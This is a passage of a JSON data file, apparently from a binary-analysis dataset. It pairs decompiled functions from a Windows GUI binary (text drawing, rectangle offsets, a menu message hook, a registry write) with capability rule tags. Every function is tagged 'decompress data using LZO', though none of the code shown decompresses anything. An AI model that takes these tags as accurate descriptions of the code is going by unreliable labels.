        "decompiled_code": "\nvoid __cdecl\nfcn.00466138(uint32_t arg_8h, uint *arg_ch, int32_t *arg_10h, int32_t arg_14h, int32_t arg_18h, uint arg_1ch, \n            int32_t arg_20h, int32_t *arg_24h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t *in_ECX;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint var_44h;\n    uint uStack68;\n    uint uStack64;\n    uint uStack60;\n    int32_t var_34h;\n    int32_t var_30h;\n    int32_t var_2ch;\n    int32_t var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t dx;\n    int32_t dy;\n    uint var_8h;\n    int32_t var_4h;\n    \n    if ((arg_8h & 2) == 2) {\n        if (arg_1ch == 0) {\n            arg_1ch._0_1_ = 1;\n        }\n        else if (arg_1ch == 1) {\n            arg_1ch._0_1_ = 0;\n        }\n    }\n    var_4h = in_EAX;\n    fcn.00413a6c();\n    if (*(var_4h + 4) == 0) {\n        fcn.00413a6c();\n    }\n    else {\n        uVar2 = (**(**(var_4h + 4) + 0x20))();\n        (**(**(var_4h + 4) + 0x2c))(uVar2);\n        fcn.00413a6c();\n    }\n    iVar4 = arg_20h;\n    if (arg_20h != 0) {\n        iVar4 = *(arg_20h + -4);\n    }\n    if (iVar4 < 1) {\n        fcn.00413a94(&var_44h, 0);\n        *arg_ch = var_44h;\n        arg_ch[1] = uStack68;\n        arg_ch[2] = uStack64;\n        arg_ch[3] = uStack60;\n        fcn.00413a6c();\n    }\n    else {\n        fcn.00413a94(&var_44h, 0);\n        *arg_ch = var_44h;\n        arg_ch[1] = uStack68;\n        arg_ch[2] = uStack64;\n        arg_ch[3] = uStack60;\n        var_34h = arg_20h;\n        if (arg_20h != 0) {\n            var_34h = *(arg_20h + -4);\n        }\n        uVar2 = fcn.00405264(var_34h, arg_ch, arg_8h | 0x400);\n        uVar2 = fcn.00421c8c(uVar2);\n        sub.user32.dll_DrawTextA(uVar2);\n        fcn.00413a6c();\n    }\n    if (arg_1ch < 2) {\n        uVar3 = (var_14h - var_1ch) + 1;\n        iVar4 = uVar3 >> 1;\n        if (iVar4 < 0) {\n            iVar4 = iVar4 + ((uVar3 & 1) != 0);\n        }\n        arg_10h[1] = iVar4;\n        uVar3 = (var_14h - var_24h) + 1;\n        dy = uVar3 >> 1;\n        if (dy < 0) {\n            dy = dy + ((uVar3 & 1) != 0);\n        }\n    }\n    else {\n        uVar3 = (var_18h - var_20h) + 1;\n        iVar4 = uVar3 >> 1;\n        if (iVar4 < 0) {\n            iVar4 = iVar4 + ((uVar3 & 1) != 0);\n        }\n        *arg_10h = iVar4;\n        uVar3 = (var_18h - var_28h) + 1;\n        dx = uVar3 >> 1;\n        if (dx < 0) {\n            dx = dx + ((uVar3 & 1) != 0);\n        }\n    }\n    if ((var_28h == 0) || (var_20h == 0)) {\n        arg_14h = 0;\n    }\n    if (arg_18h == -1) {\n        if (arg_14h < 0) {\n            fcn.00413a6c();\n            if (arg_1ch < 2) {\n                var_30h = var_18h - var_30h;\n            }\n            else {\n                var_30h = var_14h - var_2ch;\n            }\n            arg_18h = var_30h / 3;\n            arg_14h = arg_18h;\n        }\n        else {\n            fcn.00413a6c();\n            if (arg_1ch < 2) {\n                uVar3 = (var_18h - var_30h) + 1;\n                arg_18h = uVar3 >> 1;\n                if (arg_18h < 0) {\n                    arg_18h = arg_18h + ((uVar3 & 1) != 0);\n                }\n            }\n            else {\n                uVar3 = (var_14h - var_2ch) + 1;\n                arg_18h = uVar3 >> 1;\n                if (arg_18h < 0) {\n                    arg_18h = arg_18h + ((uVar3 & 1) != 0);\n                }\n            }\n        }\n    }\n    else if (arg_14h < 0) {\n        fcn.00413a6c();\n        if (arg_1ch < 2) {\n            arg_14h = var_30h - var_28h >> 1;\n            if (arg_14h < 0) {\n                arg_14h = arg_14h + ((var_30h - var_28h & 1U) != 0);\n            }\n        }\n        else {\n            arg_14h = var_2ch - var_24h >> 1;\n            if (arg_14h < 0) {\n                arg_14h = arg_14h + ((var_2ch - var_24h & 1U) != 0);\n            }\n        }\n    }\n    if (arg_1ch == 0) {\n        *arg_10h = arg_18h;\n        dx = arg_18h + var_20h + arg_14h;\n    }\n    else if (arg_1ch == 1) {\n        var_20h = (var_18h - arg_18h) - var_20h;\n        *arg_10h = var_20h;\n        dx = (var_20h - arg_14h) - var_28h;\n    }\n    else if (arg_1ch == 2) {\n        arg_10h[1] = arg_18h;\n        dy = arg_18h + var_1ch + arg_14h;\n    }\n    else if (arg_1ch == 3) {\n        var_1ch = (var_14h - arg_18h) - var_1ch;\n        arg_10h[1] = var_1ch;\n        dy = (var_1ch - arg_14h) - var_24h;\n    }\n    *arg_10h = *arg_10h + *in_ECX + *arg_24h;\n    arg_10h[1] = arg_10h[1] + in_ECX[1] + arg_24h[1];\n    fcn.00437d14();\n    cVar1 = fcn.00437e1c();\n    if (cVar1 == '\\0') {\n        sub.user32.dll_OffsetRect(arg_ch, *in_ECX + dx + *arg_24h, in_ECX[1] + dy + arg_24h[1]);\n    }\n    else {\n        sub.user32.dll_OffsetRect(arg_ch, *in_ECX + dx, in_ECX[1] + dy);\n    }\n    return;\n}\n",
        "token_count": 1898
    },
    "0046f0dc": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0046f134)\n// WARNING: Removing unreachable block (ram,0x0046f13d)\n// WARNING: Removing unreachable block (ram,0x0046f144)\n// WARNING: Removing unreachable block (ram,0x0046f154)\n// WARNING: Removing unreachable block (ram,0x0046f159)\n// WARNING: Removing unreachable block (ram,0x0046f167)\n\nvoid __fastcall fcn.0046f0dc(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x46f1a5;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    iVar1 = fcn.0046eaf4();\n    if (iVar1 != 0) {\n        if (**(param_2 + 8) == 0xc) {\n            fcn.00404f98();\n            fcn.004455dc();\n        }\n        else if (**(param_2 + 8) == 0xb00b) {\n            fcn.0046e314();\n        }\n    }\n    (**(*in_EAX + -0x10))();\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x46f1ac;\n    uStack32 = 0x46f1a4;\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 381
    },
    "00471d1c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00471e32)\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00471d1c(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h_00;\n    int32_t iStack4156;\n    uint uStack4152;\n    uchar *puStack4148;\n    uint var_1020h;\n    uint var_101ch;\n    uchar uStack34;\n    int32_t var_1ch;\n    uint var_18h;\n    uint8_t var_14h;\n    int32_t var_13h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    puStack4148 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack4152 = 0x471f26;\n    iStack4156 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack4156;\n    *NULL = fcn.00414eec();\n    cVar1 = fcn.004040e4();\n    if (cVar1 == '\\0') {\n        fcn.00403720();\n        var_13h._0_1_ = *0x491eba;\n        var_1ch = *(*NULL + 0x48);\n        var_18h = 0xffffffff;\n        if ((*(*NULL + 0x57) == '\\0') && ((*(*NULL + 0x1c) & 0x10) == 0)) {\n            var_14h = var_14h | *0x491eaa;\n        }\n        var_ch = 0xffffffff;\n    }\n    else {\n        fcn.00403720();\n        if (*(*NULL + 0x1ae) - 3 < 2) {\n            var_1ch = *(*NULL + 0x48);\n        }\n        else {\n            var_1ch = *(*NULL + 0x19c);\n            if (var_1ch < 0) {\n                var_1ch = -2;\n            }\n        }\n        var_13h._0_1_ = *((*(*NULL + 0x1ae) & 0x7f) * 2 + 0x491eb4);\n        if ((*(*NULL + 0x199) != '\\0') && (iVar2 = fcn.0046cb64(),  0x40046 < iVar2)) {\n            var_13h._0_1_ = var_13h | 0x10;\n        }\n        var_14h = fcn.00470a60();\n        if (*(*NULL + 0x19b) != '\\0') {\n            var_13h._0_1_ = var_13h | 4;\n        }\n        if ((*(in_EAX + 0x288) == '\\0') && ((*(in_EAX + 0x25c) == '\\0' || (*(*NULL + 0x1ae) != '\\x05')))) {\n            var_ch = 0xffffffff;\n        }\n        else {\n            fcn.004455ac();\n            fcn.00404e38();\n            fcn.00409638();\n            iVar2 = var_4h;\n            if (var_4h != 0) {\n                iVar2 = *(var_4h + -4);\n            }\n            if (0xffd < iVar2) {\n                iVar2 = 0xffe;\n                uStack34 = 0;\n            }\n            *(&var_101ch + iVar2 + 1) = 0;\n            var_ch = fcn.00446870(&var_101ch);\n        }\n    }\n    arg_8h_00 = &var_1ch;\n    fcn.00446870(arg_8h_00);\n    *in_FS_OFFSET = arg_8h_00;\n    iStack4156 = 0x471f2d;\n    fcn.00404da0();\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 909
    },
    "00471f44": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0047206a)\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00471f44(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h_00;\n    int32_t iStack4172;\n    uint uStack4168;\n    uchar *puStack4164;\n    uint var_1030h;\n    uint var_102ch;\n    uchar uStack50;\n    uint var_2ch;\n    uint32_t var_28h;\n    uint var_24h;\n    int32_t var_20h;\n    uchar var_1ch;\n    int32_t var_1bh;\n    uint *var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    puStack4164 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack4168 = 0x47214d;\n    iStack4172 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffefb4;\n    *NULL = fcn.00414eec();\n    fcn.00403720();\n    var_2ch = 0x20;\n    cVar1 = fcn.004040e4();\n    if (cVar1 == '\\0') {\n        var_28h = 0x7e;\n        var_1bh._0_1_ = *0x491eba;\n        var_1bh._1_2_ = *(*NULL + 0x48);\n        var_24h = 0xffffffff;\n        var_14h = NULL;\n        var_10h = 0;\n    }\n    else {\n        var_28h = 0x7c;\n        if (1 < *(*NULL + 0x1ae) - 3) {\n            var_28h = 0x7d;\n            var_20h = *(*NULL + 0x19c);\n            if (var_20h < 0) {\n                var_20h = -2;\n            }\n        }\n        var_24h = var_ch;\n        var_1bh._1_2_ = *(*NULL + 0x48);\n        var_1bh._0_1_ = *((*(*NULL + 0x1ae) & 0x7f) * 2 + 0x491eb4);\n        if (*(*NULL + 0x199) != '\\0') {\n            var_1bh._0_1_ = var_1bh | 0x10;\n        }\n        if (*(*NULL + 0x19b) != '\\0') {\n            var_1bh._0_1_ = var_1bh | 4;\n        }\n        var_1ch = fcn.00470a60();\n        if ((*(in_EAX + 0x288) == '\\0') && ((*(in_EAX + 0x25c) == '\\0' || (*(*NULL + 0x1ae) != '\\x05')))) {\n            var_14h = NULL;\n            var_10h = 0;\n        }\n        else {\n            fcn.004455ac();\n            fcn.00404e38();\n            fcn.00409638();\n            iVar2 = var_4h;\n            if (var_4h != 0) {\n                iVar2 = *(var_4h + -4);\n            }\n            if (0xffd < iVar2) {\n                iVar2 = 0xffe;\n                uStack50 = 0;\n            }\n            *(&fcn.00471f44::var_102ch + iVar2 + 1) = 0;\n            var_14h = &fcn.00471f44::var_102ch;\n            var_10h = var_4h;\n            if (var_4h != 0) {\n                var_10h = *(var_4h + -4);\n            }\n            var_28h = var_28h | 2;\n        }\n    }\n    arg_8h_00 = &fcn.00471f44::var_2ch;\n    fcn.00446870(arg_8h_00);\n    *in_FS_OFFSET = arg_8h_00;\n    uStack4168 = 0x472154;\n    iStack4172 = 0x472144;\n    fcn.00404da0();\n    iStack4172 = 0x47214c;\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 1025
    },
    "00474f98": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00474f98(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    int32_t in_stack_ffffff88;\n    uint *in_stack_ffffff8c;\n    uint32_t in_stack_ffffff90;\n    uint *arg_ch;\n    int32_t iStack104;\n    uint uStack100;\n    uchar *puStack96;\n    uint var_4ch;\n    uint var_44h;\n    uint var_34h;\n    int32_t var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uchar var_7h;\n    uint16_t var_6h;\n    int32_t var_4h;\n    \n    puStack96 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack100 = 0x47577a;\n    iStack104 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff98;\n    var_7h = 0;\n    iVar2 = fcn.004265e4();\n    (**(**(iVar2 + 0x10) + 8))();\n    iVar2 = fcn.004265e4();\n    (**(**(iVar2 + 0x14) + 8))();\n    iVar2 = fcn.004265e4();\n    (**(**(iVar2 + 0xc) + 8))();\n    var_14h = 0;\n    if ((*(in_EAX + 0x277) & 2) == 0) {\n        arg_ch = 0x4750d1;\n        (**(*in_EAX[0x96] + 100))();\n        fcn.004265e4();\n        fcn.004214d4();\n        fcn.004265e4();\n        fcn.004215f0();\n        fcn.004265e4();\n        fcn.00421c64();\n        fcn.004265e4(&fcn.00474f98::var_34h);\n        fcn.00421878();\n    }\n    else {\n        (**(*in_EAX[0x96] + 100))();\n        (**(*in_EAX + 0x44))();\n        arg_ch = &fcn.00474f98::var_34h;\n        in_stack_ffffff90 = *(in_EAX + 0x9e);\n        fcn.004265e4();\n        fcn.0043099c(in_stack_ffffff90, arg_ch);\n        fcn.00444ebc();\n        in_stack_ffffff8c = &fcn.00474f98::var_34h;\n        in_stack_ffffff88 = param_2[0x13];\n        arg_8h = &fcn.00474f98::var_44h;\n        fcn.00406c18(arg_8h, in_stack_ffffff88);\n        uVar3 = fcn.004265e4(&fcn.00474f98::var_44h);\n        fcn.004265e4(uVar3);\n        fcn.00421744(arg_8h);\n        (**(*in_EAX[0x96] + 100))();\n    }\n    cVar1 = *(param_2 + 0x1ae);\n    if ((((cVar1 == '\\0') || (cVar1 == '\\x01')) || (cVar1 == '\\x02')) || (cVar1 == '\\x05')) {\n        if ((var_6h & 0x40) != 0) {\n            var_14h = in_EAX[0xa9];\n        }\n        cVar1 = (**(*param_2 + 0x50))();\n        if (cVar1 == '\\0') {\n            var_14h = in_EAX[0xa7];\n        }\n        if (var_14h == 0) {\n            var_14h = in_EAX[0xa5];\n        }\n        if (((var_6h & 0x40) != 0) ||\n           ((*(param_2 + 0x19a) != '\\0' && (cVar1 = (**(*param_2 + 0x50))(),  cVar1 != '\\0')))) {\n            if ((*(in_EAX + 0x277) & 1) == 0) {\n                if (*(param_2 + 0x19a) == '\\0') {\n                    var_ch = -0xffffeb;\n                }\n                else {\n                    var_ch = -0xffffea;\n                }\n                in_stack_ffffff90 = param_2[0x13];\n                in_stack_ffffff8c = &fcn.00474f98::var_24h;\n                fcn.00406c18(in_stack_ffffff8c, in_stack_ffffff90);\n                in_stack_ffffff88 = var_ch;\n                uVar3 = fcn.004212f8();\n                fcn.004265e4();\n                fcn.00433b38(uVar3);\n                if (*(param_2 + 0x1ae) == '\\x02') {\n                    fcn.004265e4();\n                    fcn.00421950();\n                    fcn.004265e4();\n                    fcn.004218f0();\n                }\n            }\n            else {\n                if ((var_6h & 1) != 0) {\n                    fcn.00430810();\n                }\n                var_ch = fcn.00430810();\n                in_stack_ffffff90 = param_2[0x13];\n                in_stack_ffffff8c = &fcn.00474f98::var_24h;\n                fcn.00406c18(in_stack_ffffff8c, in_stack_ffffff90);\n                fcn.004265e4();\n                fcn.004214d4();\n                if (*(param_2 + 0x1ae) == '\\x02') {\n                    fcn.004265e4();\n                    uVar4 = fcn.004212f8();\n                    iVar2 = uVar4 >> 1;\n                    if (iVar2 < 0) {\n                        iVar2 = iVar2 + ((uVar4 & 1) != 0);\n                    }\n                    var_1ch = var_1ch - (0xe - iVar2);\n                }\n                fcn.004265e4();\n                fcn.00421878();\n                fcn.004265e4();\n                in_stack_ffffff88 = fcn.004212f8();\n                in_stack_ffffff88 = -in_stack_ffffff88;\n                fcn.004265e4();\n                iVar2 = fcn.004212f8();\n                sub.user32.dll_InflateRect(&fcn.00474f98::var_24h, -iVar2);\n                fcn.004265e4();\n                fcn.004214d4();\n                fcn.004265e4();\n                fcn.00421878();\n                fcn.004265e4();\n                uVar3 = fcn.004212f8();\n                fcn.004265e4(uVar3);\n                fcn.004212f8();\n                sub.user32.dll_InflateRect();\n                if (*(param_2 + 0x1ae) == '\\x02') {\n                    var_24h = var_1ch;\n                    fcn.004265e4();\n                    uVar4 = fcn.004212f8();\n                    iVar2 = uVar4 >> 1;\n                    if (iVar2 < 0) {\n                        iVar2 = iVar2 + ((uVar4 & 1) != 0);\n                    }\n                    var_1ch = var_1ch + (0xe - iVar2);\n                    fcn.004265e4();\n                    fcn.004214d4();\n                    fcn.004265e4();\n                    fcn.00421878();\n                    fcn.004265e4();\n                    iVar2 = fcn.004212f8();\n                    fcn.004265e4(-iVar2);\n                    fcn.004212f8();\n                    sub.user32.dll_InflateRect();\n                    fcn.004265e4();\n                    fcn.004214d4();\n                    fcn.004265e4();\n                    fcn.00421878();\n                }\n            }\n        }\n        if ((((var_14h != 0) && (-1 < param_2[0x67])) && (iVar2 = fcn.00453888(),  param_2[0x67] < iVar2)) ||\n           ((var_14h != 0 && (*(param_2 + 0x1ae) == '\\x05')))) {\n            if (((*(in_EAX + 0x289) == '\\0') || (*(in_EAX + 0x97) != '\\0')) &&\n               ((*(in_EAX + 0x97) == '\\0' || (*(param_2 + 0x1ae) != '\\x05')))) {\n                var_10h = 4;\n            }\n            else {\n                uVar4 = param_2[0x13] - *(var_14h + 0x30);\n                var_10h = uVar4 >> 1;\n                if (var_10h < 0) {\n                    var_10h = var_10h + ((uVar4 & 1) != 0);\n                }\n            }\n            iVar2 = (**(*param_2 + 0x50))(0, 3, param_2[0x67], var_10h);\n            if (((iVar2 == '\\0') && ((*(in_EAX + 7) & 0x10) == 0)) &&\n               ((cVar1 = (**(*param_2 + 0x50))(),  cVar1 != '\\0' || (iVar2 = var_14h,  var_14h != in_EAX[0xa7])))) {\n                uVar3 = 0;\n            }\n            else {\n                uVar3 = CONCAT31(iVar2 >> 8, 1);\n            }\n            fcn.004265e4();\n            fcn.00453dc8(uVar3, in_stack_ffffff88, in_stack_ffffff8c, in_stack_ffffff90, arg_ch);\n        }\n        if (*(param_2 + 0x1ae) == '\\x02') {\n            var_10h = param_2[0x13] >> 1;\n            if (var_10h < 0) {\n                var_10h = var_10h + ((param_2[0x13] & 1U) != 0);\n            }\n            fcn.004265e4();\n            fcn.004211f4();\n            cVar1 = (**(*param_2 + 0x50))();\n            if (cVar1 == '\\0') {\n                fcn.004265e4();\n                fcn.004211f4();\n            }\n            fcn.004265e4();\n            fcn.004215f0();\n            uVar3 = 3;\n            fcn.00406c34();\n            fcn.004265e4(&fcn.00474f98::var_4ch);\n            fcn.004308d0(uVar3);\n        }\n        if (((*(in_EAX + 0xa2) != '\\0') && (*(in_EAX + 0x97) == '\\0')) ||\n           ((*(in_EAX + 0x97) != '\\0' && (*(param_2 + 0x1ae) == '\\x05')))) {\n            fcn.004265e4();\n            fcn.004215f0();\n            if (((var_14h == 0) || (*(in_EAX + 0x289) == '\\0')) ||\n               ((*(param_2 + 0x1ae) == '\\x05' && ((*(param_2 + 0x1ae) != '\\x05' || (param_2[0x67] == -1)))))) {\n                var_24h = 0;\n            }\n            else {\n                var_24h = *(var_14h + 0x34);\n            }\n            var_1ch = param_2[0x12];\n            fcn.004455ac();\n            if (*(param_2 + 0x1ae) == '\\x02') {\n                fcn.004265e4();\n                uVar4 = fcn.004212f8();\n                iVar2 = uVar4 >> 1;\n                if (iVar2 < 0) {\n                    iVar2 = iVar2 + ((uVar4 & 1) != 0);\n                }\n                var_1ch = var_1ch - (0xe - iVar2);\n            }\n            if ((*(in_EAX + 0x289) == '\\0') && (var_14h != 0)) {\n                var_20h = *(var_14h + 0x30) + 4;\n            }\n            else {\n                fcn.004265e4();\n                uVar4 = fcn.00421adc();\n                iVar2 = uVar4 >> 1;\n                if (iVar2 < 0) {\n                    iVar2 = iVar2 + ((uVar4 & 1) != 0);\n                }\n                var_20h = param_2[0x13] >> 1;\n                if (var_20h < 0) {\n                    var_20h = var_20h + ((param_2[0x13] & 1U) != 0);\n                }\n                var_20h = var_20h - iVar2;\n            }\n            fcn.004265e4();\n            var_18h = fcn.00421adc();\n            var_18h = var_18h + var_20h;\n            fcn.004265e4();\n            fcn.00420c18();\n            cVar1 = (**(*param_2 + 0x50))();\n            if (cVar1 == '\\0') {\n                fcn.004265e4();\n                fcn.00420c18();\n            }\n            iVar2 = var_4h;\n            if (var_4h != 0) {\n                iVar2 = *(var_4h + -4);\n            }\n            uVar3 = fcn.00405264(iVar2, &fcn.00474f98::var_24h, 0x8105);\n            fcn.004265e4(uVar3);\n            uVar3 = fcn.00421c8c();\n            sub.user32.dll_DrawTextA(uVar3);\n        }\n    }\n    iVar2 = in_EAX[0x96];\n    fcn.004217cc(iVar2);\n    *in_FS_OFFSET = iVar2;\n    fcn.00404da0(0x475781);\n    return;\n}\n",
        "token_count": 3301
    },
    "00475940": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00475940(int32_t arg_8h, uint arg_ch, uint *arg_10h)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    bool bVar5;\n    uint var_18h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (((*0x49660c != 0) && (iVar3 = fcn.0043c984(),  iVar3 != 0)) && (cVar2 = fcn.0043e204(),  cVar2 != '\\0')) {\n        if (arg_10h[2] == 0x25) {\n            arg_10h[2] = 0x27;\n        }\n        else if (arg_10h[2] == 0x27) {\n            arg_10h[2] = 0x25;\n        }\n    }\n    iVar3 = sub.user32.dll_CallNextHookEx(*0x4965fc, arg_8h, arg_ch, arg_10h);\n    if (iVar3 != 0) {\n        return iVar3;\n    }\n    if (arg_8h != 2) {\n        return 0;\n    }\n    iVar3 = 0;\n    if (*0x491ef0 == '\\0') {\n        *0x491ef0 = '\\x01';\n        sub.user32.dll_PostMessageA(*arg_10h, 0x100, 0x28, 0);\n    }\n    iVar4 = arg_10h[1];\n    if (iVar4 != 0x100) {\n        if (iVar4 == 0x104) {\n            if (arg_10h[2] == 0x12) {\n                fcn.00404154();\n                return 0;\n            }\n        }\n        else if (iVar4 == 0x11f) {\n            if (arg_10h[2] >> 0x10 == -1) {\n                bVar5 = arg_10h[3] == 0;\n            }\n            else {\n                bVar5 = false;\n            }\n            if (bVar5) {\n                if (*0x496618 != '\\0') {\n                    return 0;\n                }\n                fcn.00404154();\n                return 0;\n            }\n            *0x496618 = '\\0';\n            if ((arg_10h[2] >> 0x10 & 0x10) != 0) {\n                sub.user32.dll_GetSubMenu(arg_10h[3], *(arg_10h + 2));\n            }\n            *0x49660c = fcn.0043d848();\n        }\n        else if (iVar4 == 0x200) {\n            iVar4 = arg_10h[5];\n            iVar1 = arg_10h[6];\n            if ((iVar4 != *0x496610) || (iVar1 != *0x496614)) {\n                iVar3 = fcn.00443aec();\n                *0x496610 = iVar4;\n                *0x496614 = iVar1;\n            }\n        }\n        goto code_r0x00475b98;\n    }\n    if (arg_10h[2] == 0xd) {\n        *(*0x496600 + 0x340) = 1;\n        goto code_r0x00475b98;\n    }\n    if (arg_10h[2] == 0x1b) {\n        *0x496618 = '\\x01';\n        goto code_r0x00475b98;\n    }\n    if (*0x49660c == 0) goto code_r0x00475b98;\n    if ((arg_10h[2] == 0x27) && (iVar3 = fcn.0043c3c4(),  iVar3 == 0)) {\n        iVar3 = fcn.00475894();\n    }\n    else {\n        if (arg_10h[2] == 0x25) {\n            fcn.00404154();\n            cVar2 = fcn.004040e4();\n            if (cVar2 != '\\0') {\n                iVar3 = fcn.00475894();\n                goto code_r0x00475b39;\n            }\n        }\n        iVar3 = 0;\n    }\ncode_r0x00475b39:\n    if (iVar3 != 0) {\n        fcn.00406c34();\n        fcn.0044502c();\n    }\ncode_r0x00475b98:\n    if (((((iVar3 != 0) && (cVar2 = fcn.004040e4(),  cVar2 != '\\0')) && (iVar4 = fcn.00471004(),  iVar4 != *0x496608))\n        && ((*(iVar3 + 0x19b) != '\\0' && (*(iVar3 + 0x30) != 0)))) && (cVar2 = fcn.0044d568(),  cVar2 != '\\0')) {\n        *0x496618 = '\\x01';\n        *(*0x496600 + 0x330) = 0;\n        fcn.00404154();\n        fcn.00404154();\n    }\n    return 0;\n}\n",
        "token_count": 1162
    },
    "004764b0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004764b0(uint param_1, int32_t param_2)\n\n{\n    uchar uVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uint uStack172;\n    uint uStack168;\n    uchar *puStack164;\n    uint var_8dh;\n    int32_t var_ch;\n    char var_5h;\n    int32_t var_4h;\n    \n    puStack164 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack168 = 0x4766af;\n    uStack172 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff54;\n    if (*(param_2 + 0xc) < *(*(in_EAX + 0x268) + 8)) {\n        var_ch = fcn.00414eec();\n        var_5h = fcn.004040e4();\n    }\n    else {\n        var_5h = *(in_EAX + 0x302) != 0;\n        puStack164 = &stack0xfffffffc;\n        if (var_5h) {\n            var_ch = 0;\n            puStack164 = &stack0xfffffffc;\n            (**(in_EAX + 0x300))(&fcn.004764b0::var_ch);\n            var_5h = var_ch != 0;\n            if (var_5h) {\n                *(var_ch + 0x1b4) = in_EAX;\n                iVar2 = fcn.00414f48();\n                if (iVar2 == -1) {\n                    fcn.00414f68();\n                    if (*(in_EAX + 0x31a) != 0) {\n                        (**(in_EAX + 0x318))();\n                    }\n                }\n            }\n        }\n    }\n    if (var_5h != '\\0') {\n        iVar2 = fcn.00404108();\n        if (*(iVar2 + 0x1ae) - 3U < 2) {\n            fcn.00406a50();\n        }\n        else {\n            fcn.004455ac();\n        }\n        fcn.00405264();\n        fcn.004095dc();\n        uVar3 = fcn.00409568();\n        *(param_2 + 0x24) = uVar3;\n        fcn.00405264();\n        fcn.004095dc();\n        iVar4 = var_4h;\n        if (var_4h != 0) {\n            iVar4 = *(var_4h + -4);\n        }\n        *(&fcn.004764b0::var_8dh + iVar4 + 1) = 0;\n        if ((*(in_EAX + 0x288) == '\\0') && ((*(in_EAX + 0x25c) == '\\0' || (*(iVar2 + 0x1ae) != '\\x05')))) {\n            *(param_2 + 0x20) = 0xffffffff;\n        }\n        else {\n            uVar3 = fcn.00446870(&fcn.004764b0::var_8dh);\n            *(param_2 + 0x20) = uVar3;\n        }\n        uVar3 = fcn.00471004();\n        *(param_2 + 0x14) = uVar3;\n        *(param_2 + 0x10) = *(iVar2 + 0x19c);\n        *(param_2 + 0x19) = *(*(iVar2 + 0x1ae) * 2 + 0x491eb4);\n        uVar1 = fcn.00470a60();\n        *(param_2 + 0x18) = uVar1;\n        *(param_2 + 0x1c) = var_ch;\n    }\n    *in_FS_OFFSET = uStack172;\n    puStack164 = 0x4766b6;\n    uStack168 = 0x4766ae;\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 901
    },
    "0048be70": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0048be70(int32_t arg_8h)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint hKey;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = 0x48be87;\n    fcn.00405254();\n    puStack24 = 0x48be8f;\n    fcn.00405254();\n    puStack24 = 0x48be97;\n    fcn.00405254();\n    uStack28 = 0x48bf12;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack24 = &stack0xfffffffc;\n    fcn.00405264(&fcn.0048be70::hKey);\n    sub.advapi32.dll_RegOpenKeyA();\n    if (arg_8h != 0) {\n        arg_8h = *(arg_8h + -4);\n    }\n    uVar1 = fcn.004052bc(arg_8h);\n    uVar1 = fcn.00405264(0, 1, uVar1);\n    sub.advapi32.dll_RegSetValueExA(hKey, uVar1);\n    sub.advapi32.dll_RegCloseKey_1();\n    *in_FS_OFFSET = hKey;\n    fcn.00404dc4(0x48bf19);\n    fcn.00404da0();\n    